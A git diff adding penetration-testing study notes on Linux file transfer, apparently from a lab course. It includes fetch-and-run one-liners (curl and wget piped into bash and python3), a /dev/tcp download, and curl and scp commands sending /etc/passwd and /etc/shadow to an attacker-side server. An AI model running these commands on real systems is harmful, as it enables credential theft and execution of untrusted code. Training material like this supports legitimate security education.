@@ -261,7 +261,9 @@ ftp> bye
 ```
 # Linux Transfer Methods
 Linux offers various tools for file transfers, which are crucial for both attackers and defenders. During an incident response, we found threat actors exploiting a SQL Injection vulnerability on web servers. They used a Bash script to download malware via three methods: cURL, wget, and Python, all using HTTP. While Linux supports FTP and SMB, most malware uses HTTP/HTTPS. Understanding these methods helps in both attacking and defending networks. This section covers file transfer methods in Linux, including HTTP, Bash, and SSH.
+
 ## Download Operations
+
 ### Base64 Encoding / Decoding
 
 __Check file MD5 hash__
@@ -300,6 +302,115 @@ Because of the way Linux works and how pipes operate, most of the tools we use i
 ![image](https://github.com/user-attachments/assets/5867d7ef-f889-4614-bbf2-9c4fc7a6516e)
 
 __Fileless Download with cURL__
+
+use curl command and directly execute it using pipe
 ```
  curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
 ```
+
+__Fileless Download with wget__
+
+Python script file from a web server and pipe it into the Python binary
+```
+wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+```
+### Download with Bash (/dev/tcp)
+
+When no well known file transfer tools are available use these.(__BASH__ version 2.04)
+
+__Connect to the target Webserver__ 
+```
+exec 3<>/dev/tcp/10.10.10.32/80
+```
+__HTTP GET Request__
+```
+ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+```
+__Print Response__
+```
+cat <&3
+```
+
+### SSH Downloads
+SSH (or Secure Shell) is a protocol that allows secure access to remote computers. SSH implementation comes with an SCP utility for remote file transfer that, by default, uses the SSH protocol.
+
+__Enabling the SSH Server__
+```
+sudo systemctl enable ssh
+```
+__Starting the SSH Server__
+```
+sudo systemctl start ssh
+```
+__Checking for SSH Listening Port__
+```
+netstat -lnpt
+```
+__Linux - Downloading Files Using SCP__
+```
+scp plaintext@192.168.49.128:/root/myroot.txt .
+```
+Better to create a new account and use that as tmp user for the above command. Due to security reasons.
+
+## Upload Operations
+
+### Web Upload
+Use uploadserver, an extended module of the Python HTTP.Server module, which includes a file upload page.
+
+__Pwnbox - Start Web Server__
+```
+sudo python3 -m pip install --user uploadserver
+```
+Now we need to create a certificate. In this example, we are using a self-signed certificate.
+
+__Pwnbox - Create a Self-Signed Certificate__
+```
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+```
+The webserver should not host the certificate. Create a new directory to host the file for our webserver.
+
+__Pwnbox - Start Web Server__
+  
+```
+mkdir https && cd https
+```
+```
+sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+```
+The target machine will upload to this server
+```
+ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure # option --insecure because we used a self-signed certificate that we trust.
+```
+### Alternative Web File Transfer Method
+
+Linux distributions usually have Python or php installed.
+ 
+__Linux - Creating a Web Server with Python3__
+```
+python3 -m http.server
+```
+__Linux - Creating a Web Server with Python2.7__
+```
+python2.7 -m SimpleHTTPServer
+```
+__Linux - Creating a Web Server with PHP__
+```
+php -S 0.0.0.0:8000
+```
+__Linux - Creating a Web Server with Ruby__
+```
+ruby -run -ehttpd . -p8000
+```
+__Download the File from the Target Machine onto the Pwnbox__
+```
+wget 192.168.49.128:8000/filetotransfer.txt
+```
+Note: When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.
+
+### SCP Upload
+__File Upload using SCP__
+```
+scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
+```
+
+
